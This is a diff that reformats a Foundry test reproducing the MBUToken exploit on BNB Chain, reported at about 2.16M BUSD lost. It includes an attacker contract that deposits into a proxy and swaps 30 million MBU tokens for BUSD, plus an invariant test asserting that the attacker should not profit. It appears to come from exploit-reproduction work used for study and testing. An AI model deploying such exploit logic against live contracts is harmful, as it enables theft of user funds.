@@ -2,10 +2,8 @@
 pragma solidity ^0.8.13;
 pragma solidity ^0.8.30;
 
-
 import "forge-std/Test.sol";
 import "./interface.sol";
-
 
 // @KeyInfo - Total Lost : ~2.16 M BUSD
 // Original Attacker : https://bscscan.com/address/0xb32a53af96f7735d47f4b76c525bd5eb02b42600
@@ -28,7 +26,7 @@ contract MBUToken_exp is Test {
     address attacker = makeAddr("attacker");
 
     function setUp() public {
-        vm.createSelectFork("bsc", 49470430 - 1);
+        vm.createSelectFork("bsc", 49_470_430 - 1);
         vm.deal(attacker, 1 ether);
     }
 
@@ -36,16 +34,12 @@ contract MBUToken_exp is Test {
         vm.startPrank(attacker);
 
         AttackerC attC = new AttackerC();
-        
+
         attC.attack{value: 1 ether}();
 
         emit log_named_decimal_uint("Profit in BUSD", IERC20(BUSD).balanceOf(attacker), 18);
     }
-    
-    
 }
-
-
 
 contract MyInvariantTest is Test {
     address public attacker;
@@ -53,7 +47,7 @@ contract MyInvariantTest is Test {
     AttackerC public attackerContract;
 
     function setUp() public {
-        vm.createSelectFork("bsc", 49470430 - 1);
+        vm.createSelectFork("bsc", 49_470_430 - 1);
 
         attacker = makeAddr("attacker");
         vm.deal(attacker, 1 ether);
@@ -63,7 +57,7 @@ contract MyInvariantTest is Test {
         attackerContract = new AttackerC();
         vm.stopPrank();
 
-        targetContract(address(attackerContract)); // 
+        targetContract(address(attackerContract)); //
 
         attackerInitialBalance = IERC20(BUSD).balanceOf(attacker);
     }
@@ -73,11 +67,6 @@ contract MyInvariantTest is Test {
         assertLe(balanceNow, attackerInitialBalance, "Attacker should not profit");
     }
 }
-
-
-
-
-
 
 contract AttackerC {
     function attack() external payable {
@@ -93,11 +82,7 @@ contract AttackerC {
         path[0] = MBU;
         path[1] = BUSD;
         IPancakeRouter(payable(router)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            30_000_000 ether,
-            0,
-            path,
-            address(this),
-            block.timestamp
+            30_000_000 ether, 0, path, address(this), block.timestamp
         );
 
         IERC20(BUSD).transfer(msg.sender, IERC20(BUSD).balanceOf(address(this)));
@@ -108,5 +93,5 @@ contract AttackerC {
 }
 
 interface I_0x95e9_ERC1967Proxy {
-    function deposit(address, uint256) external returns(uint256);
+    function deposit(address, uint256) external returns (uint256);
 }
